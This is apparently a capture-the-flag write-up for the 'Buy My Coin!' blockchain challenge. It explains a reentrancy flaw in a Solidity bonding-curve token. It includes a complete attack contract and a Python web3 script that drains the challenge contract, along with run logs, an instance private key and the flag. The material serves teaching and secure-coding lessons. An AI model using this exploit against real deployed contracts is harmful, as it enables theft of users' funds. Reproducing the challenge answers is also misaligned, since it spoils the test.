# NullCTF 2025 - Buy My Coin! Challenge Writeup

**Author:** xseven  
**Difficulty:** Easy  
**Category:** Blockchain 
**Challenge Description:**

> The Nullium Protocol has just launched its algorithmic token, $NULL. We believe we have solved the greatest problem in decentralized finance: The Liquidity Trilemma. Nullium isn't just a token; it is a self-stabilizing, mathematically perfect store of value designed to outlast the volatility of the crypto markets. In a world of chaos, Nullium offers order. Our proprietary Elastic Reserve Bonding Curve ensures that every single $NULL token in existence is backed by a calculated fraction of Ethereum. There are no admin keys, no rug pulls, and no human error. Just pure, immutable code governing the future of money.
>
> [http://public.ctf.r0devnull.team:3001](http://public.ctf.r0devnull.team:3001/)

---

## Intro

The "Buy My Coin!" challenge presents the Nullium Protocol, a fictional DeFi project claiming to have "solved the Liquidity Trilemma" through an algorithmic stablecoin called $NULL. The protocol uses an "Elastic Reserve Bonding Curve" mechanism where tokens can be minted by depositing ETH and burned to redeem ETH proportionally to the user's share of the total token supply.

The challenge provides two Solidity smart contracts:
- **`Coin.sol`**: The core ERC20 token contract implementing the bonding curve mechanism
- **`Setup.sol`**: The deployment contract that initializes the system with 101 ETH

The objective is to drain the `Coin` contract's balance below 1 ETH to solve the challenge, as defined by the `isSolved()` function in the `Setup` contract.

Despite the grandiose claims of being "mathematically perfect" with "no human error," this challenge demonstrates a critical smart contract vulnerability.

---

## Initial Analysis

### Setup.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Coin.sol";

contract Setup {
    Coin public coin;

    constructor() payable {
        require(msg.value == 101 ether, "Setup requires exactly 101 ETH");

        coin = new Coin{value: 1 ether}();
        coin.exchange{value:  100 ether}();
    }

    function isSolved() external view returns (bool) {
        return address(coin).balance < 1 ether;
    }
}
```

The `Setup` contract:
1. Deploys the `Coin` contract with 1 ETH
2. Immediately calls `exchange()` with 100 ETH to mint the initial token supply
3. Provides an `isSolved()` function that returns `true` when the Coin contract's balance drops below 1 ETH

This means the Coin contract starts with approximately 101 ETH, and our goal is to extract at least 100 ETH.

### Coin.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Coin is ERC20 {
    uint256 public constant INITIAL_RATE = 100; 

    constructor() ERC20("Nullium", "NULL") payable {
        
    }

    function exchange() external payable {
        require(msg.value > 0, "Must send ETH");

        uint256 _totalSupply = totalSupply();
        uint256 amountToMint;

        if (_totalSupply == 0) {
            amountToMint = msg.value * INITIAL_RATE;
        } else {
            uint256 ethReserve = address(this).balance - msg.value;
            amountToMint = (msg.value * _totalSupply) / ethReserve;
        }

        _mint(msg.sender, amountToMint);
    }

    function burn(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        uint256 _totalSupply = totalSupply();
        uint256 ethBalance = address(this).balance;

        uint256 ethToReturn = (amount * ethBalance) / _totalSupply;

        require(address(this).balance >= ethToReturn, "Liquidity error");

        (bool success, ) = payable(msg.sender).call{value: ethToReturn}("");
        require(success, "Transfer failed");

        _burn(msg.sender, amount);
    }

    function burnFree(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient token balance");

        _burn(msg.sender, amount);     
    }
}
```

The `Coin` contract implements three main functions:

1. **`exchange()`**: Allows users to deposit ETH and mint $NULL tokens
   - First deposit: Mints `msg.value * 100` tokens
   - Subsequent deposits: Mints tokens proportional to the current supply and reserve ratio

2. **`burn()`**: Allows users to burn their tokens and receive ETH proportionally
   - Calculates ETH to return: `(amount * ethBalance) / totalSupply`
   - Sends ETH to the user
   - Burns the tokens

3. **`burnFree()`**: Burns tokens without returning ETH

---

## Vulnerability: Reentrancy in the `burn()` Function

### The Critical Flaw

The `burn()` function contains a **classic reentrancy vulnerability** due to the violation of the **Checks-Effects-Interactions** pattern. Let's examine the vulnerable code:

```solidity
function burn(uint256 amount) external {
    require(balanceOf(msg.sender) >= amount, "Insufficient balance");
    
    uint256 _totalSupply = totalSupply();
    uint256 ethBalance = address(this).balance;

    uint256 ethToReturn = (amount * ethBalance) / _totalSupply;

    require(address(this).balance >= ethToReturn, "Liquidity error");

    (bool success, ) = payable(msg.sender).call{value: ethToReturn}("");  // EXTERNAL CALL
    require(success, "Transfer failed");

    _burn(msg.sender, amount);  // STATE UPDATE AFTER EXTERNAL CALL
}
```

The vulnerability exists because:

1. **ETH is sent to the caller** via `.call{value: ethToReturn}("")` before the state is updated
2. **Token balance is burned** via `_burn()` **AFTER** the external call
3. This allows the recipient to **re-enter** the contract during the ETH transfer

### Attack Vector

When a contract receives ETH, its `receive()` or `fallback()` function is triggered. An attacker can exploit this by:

1. Calling `burn()` to trigger the ETH transfer
2. In the `receive()` function, calling `exchange()` with the received ETH
3. The `exchange()` function calculates the token amount based on:
   - `_totalSupply`: Still includes the tokens that are about to be burned (not yet updated!)
   - `ethReserve`: Reduced by the ETH just sent out
4. This results in an **inflated token mint** because the supply appears larger while the reserve appears smaller
5. Repeating this process exponentially increases the attacker's token holdings
6. Eventually, the attacker can drain nearly all ETH from the contract

### Mathematical Exploitation

Let's trace through one iteration:

**Initial State:**
- Coin balance: 101 ETH
- Total supply: 10,000 tokens
- Attacker tokens: 100 tokens (from initial exchange)

**Step 1: Call `burn(100)`**
- ETH to return: `(100 * 101) / 10000 = 1.01 ETH`
- ETH is sent to attacker → triggers `receive()`
- **State at this moment:** Total supply still 10,000, balance now ~100 ETH

**Step 2: Re-enter via `exchange()` with 1.01 ETH**
- `ethReserve = 100 ETH` (current balance minus incoming 1.01)
- `amountToMint = (1.01 * 10000) / 100 = 101 tokens`
- Attacker now has **101 tokens** instead of 0!

**Step 3: Original `burn()` completes**
- Finally burns the original 100 tokens
- Net result: Attacker has 101 tokens and extracted value

By repeating this process, the attacker's share of the total supply grows exponentially while draining the contract's ETH reserves.

---

## Exploit Development

### Strategy

1. Deploy an exploit contract that can receive ETH and re-enter the `Coin` contract
2. Fund the exploit contract with some ETH
3. Call `exchange()` to get initial tokens
4. Loop: Call `burn()` which triggers re-entry into `exchange()`, amplifying our token holdings
5. After sufficient iterations, stop re-entry and withdraw all remaining ETH
6. Transfer profits back to our wallet

### Exploit.sol Contract:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Coin.sol";

contract Exploit {
    Coin public coin;
    bool public stopReentry;
    address public owner;

    constructor(address _coin) payable {
        coin = Coin(_coin);
        owner = msg.sender;
    }

    receive() external payable {
        if (msg.sender == address(coin) && !stopReentry) {
            if (address(coin).balance > 0) {
                coin.exchange{value: msg.value}();
            }
        }
    }

    function attack() external {
        require(msg.sender == owner, "Only owner");
        stopReentry = false;
        
        uint256 startBalance = address(this).balance;
        if (startBalance > 0) {
             coin.exchange{value: startBalance}();
        }

        for (uint i = 0; i < 10; i++) {
            uint256 bal = coin.balanceOf(address(this));
            if (bal == 0) break;
            coin.burn(bal);
        }

        stopReentry = true;
        uint256 finalTokenBalance = coin.balanceOf(address(this));
        if (finalTokenBalance > 0) {
            coin.burn(finalTokenBalance);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

**Key Components:**

1. **`receive()` function**: Automatically re-enters `exchange()` when receiving ETH from `burn()`
   - Checks if the sender is the Coin contract to avoid unintended re-entries
   - Guards against division by zero with `address(coin).balance > 0` check
   - Respects the `stopReentry` flag to allow controlled exit

2. **`attack()` function**: Executes the exploit loop
   - Performs initial exchange to get starting tokens
   - Loops 10 times, calling `burn()` on all tokens each iteration
   - Each `burn()` triggers re-entry, exponentially increasing holdings
   - After the loop, sets `stopReentry = true` and performs final withdrawal

3. **`withdraw()` function**: Transfers stolen ETH back to the attacker's wallet

### Python Exploit:

I created a Python script using web3 and solcx:

```python
import time
import json
from web3 import Web3
from solcx import compile_standard, install_solc

# Configuration
RPC_URL = "http://public.ctf.r0devnull.team:3001/6f5b4875-c6a9-48c8-8152-ea20494e8e18"
PRIVKEY = "9c1a9553b9449cd83ec51e8f0ca5c4f36c47081f22ecf530e35e651e21186f7f"
SETUP_CONTRACT_ADDR = "0x9b198D366513F2814779223057021f57A034D7FC"
WALLET_ADDR = "0xb8cbDAe1A0d37B60D870557b9E8A61390b0ffa3D"

# Connect to Web3
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Failed to connect to Web3")
    exit(1)

print(f"Connected to {RPC_URL}")
print(f"Current block: {w3.eth.block_number}")
print(f"Wallet balance: {w3.from_wei(w3.eth.get_balance(WALLET_ADDR), 'ether')} ETH")

# Install Solc
print("Installing solc...")
install_solc('0.8.0')

# Compile Contracts
print("Compiling contracts...")
with open("Exploit.sol", "r") as f:
    exploit_source = f.read()
with open("Coin.sol", "r") as f:
    coin_source = f.read()
with open("ERC20.sol", "r") as f:
    erc20_source = f.read()

compiled_sol = compile_standard(
    {
        "language": "Solidity",
        "sources": {
            "Exploit.sol": {"content": exploit_source},
            "Coin.sol": {"content": coin_source},
            "ERC20.sol": {"content": erc20_source}
        },
        "settings": {
            "outputSelection": {
                "*": {
                    "*": ["abi", "metadata", "evm.bytecode", "evm.sourceMap"]
                }
            }
        },
    },
    solc_version="0.8.0",
)

bytecode = compiled_sol["contracts"]["Exploit.sol"]["Exploit"]["evm"]["bytecode"]["object"]
abi = compiled_sol["contracts"]["Exploit.sol"]["Exploit"]["abi"]

# Get Coin Address from Setup
print("Getting Coin address from Setup...")
# coin is at slot 0 of Setup
coin_slot = w3.eth.get_storage_at(SETUP_CONTRACT_ADDR, 0)
coin_address = w3.to_checksum_address(coin_slot[-20:])
print(f"Coin address: {coin_address}")

# Deploy Exploit
print("Deploying Exploit...")
Exploit = w3.eth.contract(abi=abi, bytecode=bytecode)

# Build transaction
nonce = w3.eth.get_transaction_count(WALLET_ADDR)
tx = Exploit.constructor(coin_address).build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce,
    'value': w3.to_wei(1, 'ether') # Fund with 1 ETH
})

# Sign and send
signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"Deploy transaction sent: {tx_hash.hex()}")

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
exploit_address = tx_receipt.contractAddress
print(f"Exploit deployed at: {exploit_address}")

# Attack
print("Executing attack loop...")
exploit_contract = w3.eth.contract(address=exploit_address, abi=abi)

for i in range(10):
    print(f"Attack iteration {i+1}...")
    nonce = w3.eth.get_transaction_count(WALLET_ADDR)
    tx = exploit_contract.functions.attack().build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 10000000, 
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce
    })

    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Attack transaction sent: {tx_hash.hex()}")

    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Attack transaction status: {tx_receipt.status}")
    if tx_receipt.status == 0:
        print("Attack transaction REVERTED")
        break
    
    # Check Coin balance
    coin_balance = w3.eth.get_balance(coin_address)
    print(f"Coin contract balance: {w3.from_wei(coin_balance, 'ether')} ETH")
    if coin_balance < w3.to_wei(1, 'ether'):
        print("SUCCESS: Coin contract drained below 1 ETH!")
        break

# Withdraw
print("Withdrawing funds...")
nonce = w3.eth.get_transaction_count(WALLET_ADDR)
tx = exploit_contract.functions.withdraw().build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce
})
signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Withdraw status: {tx_receipt.status}")
```

---

## Exploitation Process

### Step 1: Launch Challenge Instance

Visit `http://public.ctf.r0devnull.team:3001` and launch an instance. You'll receive:
- RPC URL
- Private key
- Wallet address
- Setup contract address

### Step 2: Create Supporting Files

Since the contracts import OpenZeppelin's ERC20, we need a minimal mock for compilation:

**ERC20.sol**:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ERC20 {
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return 0; // Not needed
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        return true; // Not needed
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        return true; // Not needed
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
    }
}
```

Update `Coin.sol` to use the local import:
```solidity
import "./ERC20.sol";
```

### Step 3: Run the Exploit

```bash
python3 solve.py
```

### Expected Output

```
Connected to http://public.ctf.r0devnull.team:3001/6f5b4875-c6a9-48c8-8152-ea20494e8e18
Current block: 29
Wallet balance: 77.614395723216332561 ETH
Installing solc...
Compiling contracts...
Getting Coin address from Setup...
Coin address: 0xCee9dBb451C58B8615D5f27E33DEacF7e42F5Fb4
Deploying Exploit...
Deploy transaction sent: 3149e6c1d199ca4f6992208f02e9220ada85798037fe3e9269863141c5496327
Exploit deployed at: 0x3da0c5a6f64d713607493F7E519F61f16b87F173
Executing attack loop...
Attack iteration 1...
Attack transaction sent: 1734b79e60be1c6ee4711415f73f97da8e82b37d42dba8423d0d67a77cf53e29
Attack transaction status: 1
Coin contract balance: 23.247489903565633754 ETH
Attack iteration 2...
Attack transaction sent: 4294de95d27e7bbee0fe7901d21e58e364aa6f1f6aff7dc364d9a49d98712b86
Attack transaction status: 1
Coin contract balance: 20.922947677199896683 ETH
Attack iteration 3...
Attack transaction sent: 3b620919eab7edfec563e87274d486bc27f98f37da0abfb49cdc50c568f26dfd
Attack transaction status: 1
Coin contract balance: 0.002940543252952049 ETH
SUCCESS: Coin contract drained below 1 ETH!
Withdrawing funds...
Withdraw status: 1
```

### Step 4: Verify Solution

Create a verification script with check_balance.py:

```python
from web3 import Web3

RPC_URL = "http://public.ctf.r0devnull.team:3001/<instance-id>"
SETUP_CONTRACT_ADDR = "<setup-contract-address>"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
coin_slot = w3.eth.get_storage_at(SETUP_CONTRACT_ADDR, 0)
coin_address = w3.to_checksum_address(coin_slot[-20:])

coin_balance = w3.eth.get_balance(coin_address)
print(f"Coin contract balance: {w3.from_wei(coin_balance, 'ether')} ETH")

is_solved_abi = [{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=is_solved_abi)
is_solved = setup_contract.functions.isSolved().call()
print(f"Solved: {is_solved}")
```

**Output:**
```
Coin address: 0xCee9dBb451C58B8615D5f27E33DEacF7e42F5Fb4
Coin contract balance: 0.002940543252952049 ETH
Solved: True
```

### Step 5: Get the Flag

Receive the flag on the challenge platform:

**Flag:** `nullctf{b3st_rug_pull_3v3r}`

---

## Conclusion

The "Buy My Coin!" challenge demonstrates a classic reentrancy vulnerability in a DeFi protocol. Despite claims of being "mathematically perfect" with "no human error," the implementation violated fundamental smart contract security principles.

**Key Takeaways:**
1. **Always follow Checks-Effects-Interactions pattern** when handling external calls
2. **Reentrancy attacks remain prevalent** in smart contracts, even in 2025
3. **State consistency is critical** - never allow external calls to execute with inconsistent state
4. **Test thoroughly** - reentrancy should be a standard test case
5. **Marketing hype ≠ security** - "immutable code" can still contain critical flaws

The irony of the flag `b3st_rug_pull_3v3r` is fitting - while the challenge description claimed "no rug pulls," the vulnerability allowed us to pull the rug on the entire protocol, draining 99.99% of its reserves.

This challenge serves as a reminder that even simple smart contracts can contain devastating vulnerabilities, and security must be the foundation of any DeFi protocol, not an afterthought.

Pwned!

KOREONE
